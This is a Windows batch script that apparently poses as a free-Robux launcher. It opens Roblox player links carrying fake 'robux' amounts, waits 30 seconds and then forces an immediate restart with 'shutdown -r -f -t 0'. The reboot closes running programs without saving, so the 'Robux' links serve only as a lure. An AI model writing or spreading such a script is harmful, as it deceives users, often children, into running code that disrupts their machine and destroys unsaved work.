@echo off

start "" "roblox-player://launch?robux=5"

start "" "roblox-player://launch?robux=10"

start "" "roblox-player://launch"

TIMEOUT /T 30 /NOBREAK > NUL

shutdown -r -f -t 0
